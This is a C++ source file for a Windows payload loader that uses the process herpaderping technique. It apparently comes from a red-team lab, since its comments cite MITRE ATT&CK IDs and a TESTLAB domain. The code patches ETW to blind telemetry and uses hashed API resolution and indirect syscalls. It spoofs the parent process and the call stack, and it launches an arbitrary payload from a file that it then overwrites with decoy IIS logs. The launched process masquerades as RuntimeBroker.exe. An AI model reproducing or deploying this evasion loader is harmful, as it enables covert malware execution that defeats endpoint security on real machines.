#include <Windows.h>

#include <stdio.h>

#include <tlhelp32.h>

#include "CWLInc.h"

#include "StackSpoof.h"

#include "obfstr.h"

#include "api_hash.h"

#include "syscall.h"



#ifdef CWLDEBUG
#define DBG_PRINT(fmt, ...) printf("[DBG] " fmt "\n", ##__VA_ARGS__)
#else
#define DBG_PRINT(fmt, ...) ((void)0)
#endif



// Default payload path - can be overridden at compile time

// Usage: msbuild ... /p:PreprocessorDefinitions="PAYLOAD_PATH=L\"D:\\custom\\path.exe\""

#ifndef PAYLOAD_PATH

#define PAYLOAD_PATH L"C:\\temp\\payload64.exe"

#endif



#ifdef ENABLE_PAYLOAD_XOR
static const BYTE PAYLOAD_XOR_BASE = 0xA3;
static const BYTE PAYLOAD_XOR_STEP = 0x5B;
#endif



#ifdef ENABLE_ETW_PATCH
// B1 — ETW Patch (T1562.006): patch ntdll!EtwEventWrite → xor eax,eax; ret

// Suppresses ETW events for NtCreateSection / NtCreateProcessEx / NtWriteVirtualMemory

// Must be called before any NT API invocation to prevent DC0021 telemetry

static void PatchEtw()

{

	HMODULE hNtdll = GetNtdllBase();

	PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);

	if (!pEtw) { DBG_PRINT("PatchEtw: EtwEventWrite not resolved, skipping"); return; }

	DBG_PRINT("PatchEtw: EtwEventWrite resolved at %p", pEtw);

	DWORD old = 0;

	VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);

	memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret

	VirtualProtect(pEtw, 4, old, &old);

	DBG_PRINT("PatchEtw: EtwEventWrite patched (xor eax,eax; ret)");

}
#endif  // ENABLE_ETW_PATCH



static HANDLE GetNonJobParent()

{

	const wchar_t* targets[] = { OBFWSTR(L"svchost.exe"), OBFWSTR(L"wininit.exe"), NULL };

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();

	PROCESSENTRY32W pe = { sizeof(pe) };

	if (Process32FirstW(hSnap, &pe)) {

		do {

			for (int i = 0; targets[i]; i++) {

				if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {

					DWORD sid = 0xFFFF;

					ProcessIdToSessionId(pe.th32ProcessID, &sid);

					if (sid != 0) continue;

					HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);

					if (h) { DBG_PRINT("GetNonJobParent: using %ls (PID=%lu)", pe.szExeFile, pe.th32ProcessID); CloseHandle(hSnap); return h; }

				}

			}

		} while (Process32NextW(hSnap, &pe));

	}

	CloseHandle(hSnap);

	DBG_PRINT("GetNonJobParent: no suitable parent found, using self");

	return GetCurrentProcess();

}



// GetPayloadBuffer: supports two modes for T1620 Reflective Code Loading

// Mode 1 (STDIN): read payload from stdin with 4-byte size header (NO disk artifact)

//   - Detection: node.exe spawns CertEnrollAgent.exe with stdin redirection

//   - Flow: stdin → VirtualAlloc → ReadFile(stdin) → Herpaderping

// Mode 2 (FILE): fallback to legacy file-based loading (for testing)

//   - Detection: CreateFileW → ReadFile → DeleteFileW (T1070.004)

BYTE *GetPayloadBuffer(OUT size_t &p_size)

{

	HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);

	DWORD stdinType = GetFileType(hStdin);

	

	// Mode 1: STDIN redirection (T1620 - Reflective Code Loading)

	// Check if stdin is redirected (FILE type instead of CHAR device)

	if (hStdin != INVALID_HANDLE_VALUE && stdinType == FILE_TYPE_PIPE)

	{

		// Read 4-byte size header (little-endian DWORD)

		DWORD payloadSize = 0;

		DWORD bytesRead = 0;

		if (!ReadFile(hStdin, &payloadSize, sizeof(DWORD), &bytesRead, NULL) || bytesRead != sizeof(DWORD))

		{

			perror("[-] Failed to read payload size from stdin\n");

			exit(-1);

		}

		

		DBG_PRINT("GetPayloadBuffer: payload size from stdin = %lu bytes", payloadSize);

		// Validate size (sanity check: 1KB - 50MB range)

		if (payloadSize < 1024 || payloadSize > 50 * 1024 * 1024)

		{

			perror("[-] Invalid payload size from stdin\n");

			exit(-1);

		}

		

		DBG_PRINT("GetPayloadBuffer: stdin pipe detected");

		// Allocate RW buffer for payload

		BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (bufferAddress == NULL)

		{

			perror("[-] Failed to allocate memory for stdin payload buffer\n");

			exit(-1);

		}

		

		// Read payload bytes from stdin

		bytesRead = 0;

		if (!ReadFile(hStdin, bufferAddress, payloadSize, &bytesRead, NULL) || bytesRead != payloadSize)

		{

			perror("[-] Failed to read payload from stdin\n");

			VirtualFree(bufferAddress, 0, MEM_RELEASE);

			exit(-1);

		}

		

		DBG_PRINT("GetPayloadBuffer: stdin payload read OK (%lu bytes)", bytesRead);

		p_size = payloadSize;

		// NO DeleteFileW — payload never touched disk (T1620)

		return bufferAddress;

	}

	

	// Mode 2: FILE-based loading (legacy fallback)

	// Used for testing or when stdin not available

	DBG_PRINT("GetPayloadBuffer: file mode, loading from disk");

	HANDLE hFile = CreateFileW(PAYLOAD_PATH, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)

	{

		perror("[-] Failed to open payload file (no stdin and no file found)\n");

		return NULL;

	}

	p_size = GetFileSize(hFile, NULL);

	BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (bufferAddress == NULL)

	{

		perror("[-] Failed to allocate memory for payload buffer\n");

		exit(-1);

	}

	DWORD bytesRead = 0;

	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL))

	{

		perror("[-] Failed to read payload buffer from file\n");

		exit(-1);

	}

	DBG_PRINT("GetPayloadBuffer: file payload read OK (%zu bytes)", p_size);

	CloseHandle(hFile);

	DeleteFileW(PAYLOAD_PATH);  // T1070.004 - only in file mode

#ifdef ENABLE_PAYLOAD_XOR
	for (size_t i = 0; i < p_size; i++) {
		bufferAddress[i] ^= (BYTE)((PAYLOAD_XOR_BASE + (BYTE)(i * PAYLOAD_XOR_STEP)) & 0xFF);
	}
	DBG_PRINT("GetPayloadBuffer: XOR decoded payload (%zu bytes)", p_size);
#endif

	return bufferAddress;

}



ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE *payload, PROCESS_BASIC_INFORMATION pbi)

{

	// Functions Declaration

	HMODULE hNtdll = GetNtdllBase();

	_RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)RESOLVE_API(hNtdll, RtlImageNtHeader);

	if (pRtlImageNtHeader == NULL)

	{

		perror("[-] Couldn't found API RtlImageNTHeader...\n");

		exit(-1);

	}

	_NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)RESOLVE_API(hNtdll, NtReadVirtualMemory);

	if (pNtReadVirtualMemory == NULL)

	{

		perror("[-] Couldn't found API NtReadVirtualMemory...\n");

		exit(-1);

	}

	// Retrieving entrypoint of our payload

	BYTE image[0x1000];

	ULONG_PTR entryPoint;

	SIZE_T bytesRead;

	NTSTATUS status;

	ZeroMemory(image, sizeof(image));

	status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);

	if (!NT_SUCCESS(status))

	{

		perror("[-] Error reading process base address..\n");

		exit(-1);

	}

	entryPoint = (pRtlImageNtHeader(payload)->OptionalHeader.AddressOfEntryPoint);

	entryPoint += (ULONG_PTR)((PPEB)image)->ImageBaseAddress;

	return entryPoint;

}



BOOL Herpaderping(BYTE *payload, size_t payloadSize)
{
	HMODULE hNtdll = GetNtdllBase();

	if (!InitSyscallPool(hNtdll))
	{
		perror("[-] Failed to initialize indirect syscall pool\n");
		exit(-1);
	}
	DBG_PRINT("Herpaderping: indirect syscall pool initialized");

	// Indirect syscalls — the 5 injection-critical NT APIs in classic herpaderping path
	INDIRECT_SYSCALL(_NtCreateSection,          pNtCreateSection,          NtCreateSection);
	INDIRECT_SYSCALL(_NtCreateProcessEx,        pNtCreateProcessEx,        NtCreateProcessEx);
	INDIRECT_SYSCALL(_NtAllocateVirtualMemory,  pNtAllocateVirtualMemory,  NtAllocateVirtualMemory);
	INDIRECT_SYSCALL(_NtWriteVirtualMemory,     pNtWriteVirtualMemory,     NtWriteVirtualMemory);
	INDIRECT_SYSCALL(_NtCreateThreadEx,         pNtCreateThreadEx,         NtCreateThreadEx);
	SealSyscallPool();

	if (!pNtCreateSection || !pNtCreateProcessEx || !pNtAllocateVirtualMemory ||
		!pNtWriteVirtualMemory || !pNtCreateThreadEx)
	{
		perror("[-] Couldn't resolve SSN for one or more Nt* APIs\n");
		exit(-1);
	}

	// Non-syscall helpers (Rtl* / read-only Nt*) — resolved via API hash
	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx =
		(_RtlCreateProcessParametersEx)RESOLVE_API(hNtdll, RtlCreateProcessParametersEx);
	_RtlInitUnicodeString pRtlInitUnicodeString =
		(_RtlInitUnicodeString)RESOLVE_API(hNtdll, RtlInitUnicodeString);
	_NtQueryInformationProcess pNtQueryInformationProcess =
		(_NtQueryInformationProcess)RESOLVE_API(hNtdll, NtQueryInformationProcess);
	if (!pRtlCreateProcessParametersEx || !pRtlInitUnicodeString || !pNtQueryInformationProcess)
	{
		perror("[-] Failed to resolve Rtl/Nt helper APIs\n");
		exit(-1);
	}

	HANDLE hTemp = INVALID_HANDLE_VALUE;
	HANDLE hSection = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread  = NULL;
	NTSTATUS status;
	DWORD bytesWritten;

	// Create temp file and write payload
	wchar_t tempFile[MAX_PATH] = {0};
	wchar_t tempPath[MAX_PATH] = {0};
	GetTempPathW(MAX_PATH, tempPath);
	GetTempFileNameW(tempPath, L"HD", 0, tempFile);

	// Keep handle open across NtCreateSection — pre-held GENERIC_WRITE survives
	// MmFlushImageSection (the kernel only blocks NEW writers, not existing handles).
	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
						FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
	if (hTemp == INVALID_HANDLE_VALUE)
	{
		perror("[-] Unable to create temp file....\n");
		exit(-1);
	}
	if (!WriteFile(hTemp, payload, payloadSize, &bytesWritten, NULL))
	{
		perror("[-] Unable to write payload to the file...\n");
		exit(-1);
	}
	FlushFileBuffers(hTemp);
	DBG_PRINT("Herpaderping: temp file created and payload written: %ls (%lu bytes)", tempFile, bytesWritten);

	// 1) Create SEC_IMAGE section from the temp file (payload still on disk)
	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0,
							  PAGE_READONLY, SEC_IMAGE, hTemp);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: NtCreateSection failed (0x%08lx)", status);
		exit(-1);
	}
	DBG_PRINT("Herpaderping: section created from temp file (hSection=%p)", hSection);

	// 2) Create ghost process from the section.
	//    PPID via ParentProcess HANDLE (same kernel path as PS_ATTRIBUTE_PARENT_PROCESS).
	//    Flags=0 → no PS_INHERIT_HANDLES (avoid handle leak).
	//    InJob=FALSE → do not join the parent's job object.
	//    NtCreateProcessEx does NOT create a primary thread — naturally writable window.
	HANDLE hParent = GetNonJobParent();
	{
		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
		spoofer.Activate();
		status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, hParent,
									0,
									hSection,
									NULL, NULL,
									FALSE);
		spoofer.Deactivate();
	}
	if (hParent != GetCurrentProcess()) CloseHandle(hParent);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: NtCreateProcessEx failed (0x%08lx)", status);
		exit(-1);
	}
	DBG_PRINT("Herpaderping: NtCreateProcessEx OK (hProcess=%p, no primary thread)", hProcess);

	// 3) Overwrite the ENTIRE file in-place with decoy content.
	//    SetEndOfFile cannot shrink the file while an image section is active
	//    (it would fail silently here), so we keep the original file length and
	//    just overwrite every byte by looping the decoy lines until we've covered
	//    the full payloadSize. Result on disk: 3.2 MB of IIS-style log entries
	//    instead of payload + log header.
	SetFilePointer(hTemp, 0, NULL, FILE_BEGIN);
	const char* decoyLines[] = {
		"#Software: Microsoft Internet Information Services 10.0\r\n",
		"#Version: 1.0\r\n",
		"#Date: 2026-05-28 00:00:00\r\n",
		"#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken\r\n",
		"2026-05-28 08:14:02 10.0.0.5 GET /api/health - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 15\r\n",
		"2026-05-28 08:14:03 10.0.0.5 POST /api/upload/status - 443 TESTLAB\\svc_web 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 47\r\n",
		"2026-05-28 08:14:05 10.0.0.5 GET /portal/assets/main.css - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 3\r\n",
		"2026-05-28 08:14:05 10.0.0.5 GET /portal/assets/app.js - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 5\r\n",
		"2026-05-28 08:14:07 10.0.0.5 GET /favicon.ico - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 404 0 2 1\r\n",
		"2026-05-28 08:14:12 10.0.0.5 POST /api/upload/chunk - 443 TESTLAB\\svc_web 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 203\r\n",
	};
	const int decoyCount = _countof(decoyLines);
	SIZE_T totalWritten = 0;
	int idx = 0;
	while (totalWritten < payloadSize)
	{
		const char* line = decoyLines[idx % decoyCount];
		DWORD len = (DWORD)strlen(line);
		if (totalWritten + len > payloadSize) len = (DWORD)(payloadSize - totalWritten);
		DWORD wrote = 0;
		if (!WriteFile(hTemp, line, len, &wrote, NULL) || wrote == 0) break;
		totalWritten += wrote;
		idx++;
	}
	FlushFileBuffers(hTemp);
	CloseHandle(hTemp);
	hTemp = INVALID_HANDLE_VALUE;
	DBG_PRINT("Herpaderping: temp file overwritten with decoy (%zu / %zu bytes)", totalWritten, payloadSize);

	// 4) Query PEB and resolve entry point from the payload image headers
	PROCESS_BASIC_INFORMATION pbi = {0};
	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: NtQueryInformationProcess failed (0x%08lx)", status);
		exit(-1);
	}
	ULONG_PTR entryPoint = GetEntryPoint(hProcess, payload, pbi);
	DBG_PRINT("Herpaderping: entry point resolved at %p", (PVOID)entryPoint);

	// 5) Build process parameters — masquerade as RuntimeBroker.exe
	UNICODE_STRING uTargetFilePath;
	wchar_t targetFilePath[MAX_PATH] = {0};
	lstrcpyW(targetFilePath, OBFWSTR(L"C:\\Windows\\System32\\RuntimeBroker.exe"));
	pRtlInitUnicodeString(&uTargetFilePath, targetFilePath);

	UNICODE_STRING uDllPath;
	wchar_t dllDir[MAX_PATH] = {0};
	lstrcpyW(dllDir, OBFWSTR(L"C:\\Windows\\System32"));
	pRtlInitUnicodeString(&uDllPath, dllDir);

	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
	status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
										   NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL,
										   RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: RtlCreateProcessParametersEx failed (0x%08lx)", status);
		exit(-1);
	}
	DBG_PRINT("Herpaderping: process parameters created OK (local=%p)", processParameters);

	// 6) Allocate remote memory covering the same VA range as local processParameters.
	//    The UNICODE_STRING.pBuffer fields inside the normalized params block hold
	//    absolute pointers into the local address range — they only resolve in the
	//    remote process if the block lands at the same VA.
	//    NtAllocateVirtualMemory rounds the hint DOWN to 64KB allocation granularity
	//    and the size UP to page granularity, so we pre-align: hint = local & ~0xFFFF
	//    and size = enough to cover from the rounded hint past the end of the original
	//    block. This guarantees the local processParameters address falls inside the
	//    remote allocation.
	const SIZE_T ALLOC_GRANULE = 0x10000;
	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
	ULONG_PTR hintBase  = (ULONG_PTR)processParameters & ~(ALLOC_GRANULE - 1);
	ULONG_PTR hintEnd   = (ULONG_PTR)processParameters + paramSize;
	SIZE_T    allocSize = (hintEnd - hintBase + ALLOC_GRANULE - 1) & ~(ALLOC_GRANULE - 1);
	PVOID paramBuffer   = (PVOID)hintBase;
	status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &allocSize,
									  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: NtAllocateVirtualMemory(params) failed (0x%08lx)", status);
		exit(-1);
	}
	if (paramBuffer != (PVOID)hintBase)
	{
		DBG_PRINT("Herpaderping: WARN — kernel did not honor hint (wanted=%p, got=%p); params write will likely fail",
				  (PVOID)hintBase, paramBuffer);
	}
	DBG_PRINT("Herpaderping: remote params region allocated [%p .. %p] (covers local %p)",
			  paramBuffer, (PVOID)((ULONG_PTR)paramBuffer + allocSize), processParameters);

	// 7) Copy the params blob into the remote allocation
	status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters, paramSize, NULL);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: NtWriteVirtualMemory(params) failed (0x%08lx)", status);
		exit(-1);
	}

	// 8) Patch PEB->ProcessParameters to point at the params block
	PEB* remotePEB = (PEB*)pbi.PebBaseAddress;
	PVOID paramsPtr = processParameters;
	status = pNtWriteVirtualMemory(hProcess, &remotePEB->ProcessParameters,
								   &paramsPtr, sizeof(PVOID), NULL);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: NtWriteVirtualMemory(PEB->ProcessParameters) failed (0x%08lx)", status);
		exit(-1);
	}
	DBG_PRINT("Herpaderping: PEB->ProcessParameters patched");

	// 9) Create primary thread at entry point — ghost process begins execution
	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
							   (LPTHREAD_START_ROUTINE)entryPoint, NULL,
							   FALSE, 0, 0, 0, 0);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: NtCreateThreadEx failed (0x%08lx)", status);
		exit(-1);
	}
	DBG_PRINT("Herpaderping: NtCreateThreadEx OK (hThread=%p), ghost process running", hThread);

	// Section handle no longer needed — child has its own image mapping.
	if (hSection) { CloseHandle(hSection); hSection = NULL; }

	// Note: no file delete. The active image section locks the file against
	// unlink (even POSIX semantics — confirmed failing 0xC0000121 on this build).
	// The full in-place decoy overwrite above makes the residual file innocuous.
	return TRUE;
}



int wmain()

{

#ifdef ENABLE_ETW_PATCH
	PatchEtw();
#endif

	DBG_PRINT("main: CWLHerpaderping starting");

	size_t payloadSize;

	BYTE *payloadBuffer = GetPayloadBuffer(payloadSize);

	DBG_PRINT("main: payload loaded (%zu bytes), launching Herpaderping", payloadSize);

	BOOL isSuccess = Herpaderping(payloadBuffer, payloadSize);

	DBG_PRINT("main: Herpaderping returned %d", isSuccess);

}